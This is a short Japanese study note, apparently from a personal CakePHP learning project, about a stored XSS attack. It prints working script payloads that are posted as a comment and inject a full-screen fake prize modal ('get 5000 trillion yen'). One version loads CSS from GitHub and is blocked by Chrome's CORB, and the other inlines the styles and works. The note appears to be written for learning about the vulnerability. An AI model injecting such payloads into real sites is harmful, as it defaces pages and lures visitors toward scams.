# XSS攻撃について

## うまくいかなかった方法（CSSを外部ファイルで読み込む）

- XSS用に、GitHubにCSSを用意したが、ChromeのCORB（Cross-Origin Read Blocking）機能により、CSSが読み込まれなかった

<https://chromestatus.com/feature/5629709824032768>

- コメント内容に登録する文字列

```html
<script>modalContent = document.createElement('div');modalContent.innerHTML = '<link href="https://raw.githubusercontent.com/q23isline/study_cakephp/feature/add-board/xss-attack/css/modal.css" rel="stylesheet"><div id="xss-modal-back"><div id="xss-modal"><img src="https://avatars.githubusercontent.com/u/41276551?v=4" id="xss-img" /><div id="xss-text">おめでとうございます！<br /><a href="#" id="xss-link">＞＞ 5000兆円手に入れる ＜＜</a></div></div></div>';document.getElementById('comments').appendChild(modalContent)</script>
```

- ↑のinnerHTMLで埋め込んでいる内容を見えやすくしたもの↓

```html
<link href="https://raw.githubusercontent.com/q23isline/study_cakephp/feature/add-board/xss-attack/css/modal.css" rel="stylesheet">
<div id="xss-modal-back">
  <div id="xss-modal">
    <img src="https://avatars.githubusercontent.com/u/41276551?v=4" id="xss-img" />
    <div id="xss-text">
      おめでとうございます！<br />
      <a href="#" id="xss-link">＞＞ 5000兆円手に入れる ＜＜</a>
    </div>
  </div>
</div>
```

## うまくいった方法（直接スタイルを指定する）

- コメント内容に登録する文字列

```html
<script>modalContent = document.createElement('div');modalContent.innerHTML = '<div style="display:block;position:fixed;z-index:1;left:0px;top:0px;height:100%;width:100%;overflow:hidden;background-color:rgba(0, 0, 0, 0.5);"><div style="margin:15vh auto;height:60vh;width:50%;background-color:#f4f4f4;"><img src="https://avatars.githubusercontent.com/u/41276551?v=4" style="display:block;margin:auto;"><div style="text-align:center;">おめでとうございます！<br><a href="#" style="font-size:2em">＞＞ 5000兆円手に入れる ＜＜</a></div></div></div>';document.getElementById('comments').appendChild(modalContent)</script>
```

- ↑のinnerHTMLで埋め込んでいる内容を見えやすくしたもの↓

```html
<div
  style="
    display: block;
    position: fixed;
    z-index: 1;
    left: 0px;
    top: 0px;
    height: 100%;
    width: 100%;
    overflow: hidden;
    background-color: rgba(0, 0, 0, 0.5);
  "
>
  <div
    style="
      margin: 15vh auto;
      height: 60vh;
      width: 50%;
      background-color: #f4f4f4;
    "
  >
    <img
      src="https://avatars.githubusercontent.com/u/41276551?v=4"
      style="display: block; margin: auto"
    />
    <div style="text-align: center">
      おめでとうございます！<br />
      <a href="#" style="font-size: 2em">＞＞ 5000兆円手に入れる ＜＜</a>
    </div>
  </div>
</div>
```
